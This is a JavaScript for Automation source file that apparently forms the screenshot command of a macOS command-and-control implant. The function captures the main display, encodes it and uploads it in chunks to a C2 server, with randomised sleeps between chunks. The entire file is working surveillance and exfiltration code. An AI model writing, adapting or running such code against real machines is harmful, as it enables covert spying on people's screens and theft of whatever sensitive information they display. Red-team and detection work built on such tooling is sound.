exports.screenshot = function(task, command, params){
    try{
        ObjC.import('Cocoa');
        ObjC.import('AppKit');
        let cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
        if(cgimage.js === undefined) {
            cgimage = $.CFMakeCollectable(cgimage); // in case 10.15 is messing with the types again
        }
        if(cgimage.js === undefined){
          return {"user_output":"Failed to get image from display", "completed": true, "status": "error"};
        }
        let bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
        let capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
        let offset = 0;
        let chunkSize = 350000;
        let fileSize = parseInt(capture.length);
        // always round up to account for chunks that are < chunksize;
        let numOfChunks = Math.ceil(fileSize / chunkSize);
        let registerData = {'total_chunks': numOfChunks, 'task': task.id, "is_screenshot": true};
        let registerFile = C2.postResponse(task, registerData);
        if (registerFile['responses'][0]['status'] === "success"){
            let currentChunk = 1;
            let csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
            let data = capture.subdataWithRange($.NSMakeRange(offset, csize));
            while(parseInt(data.length) > 0 && offset < fileSize){
                // send a chunk
                let fileData = {'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['responses'][0]['file_id']};
                C2.postResponse(task, fileData);
                $.NSThread.sleepForTimeInterval(C2.gen_sleep_time());

                // increment the offset and seek to the amount of data read from the file
                offset = offset + parseInt(data.length);
                csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
                data = capture.subdataWithRange($.NSMakeRange(offset, csize));
                currentChunk += 1;
            }
            return {"user_output":JSON.stringify({"file_id": registerFile['responses'][0]['file_id']}), "completed": true};
        }
        else{
            return {"user_output":"Failed to register file to download", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":"Failed to get a screencapture: " + error.toString(), "completed": true, "status": "error"};
    }
};
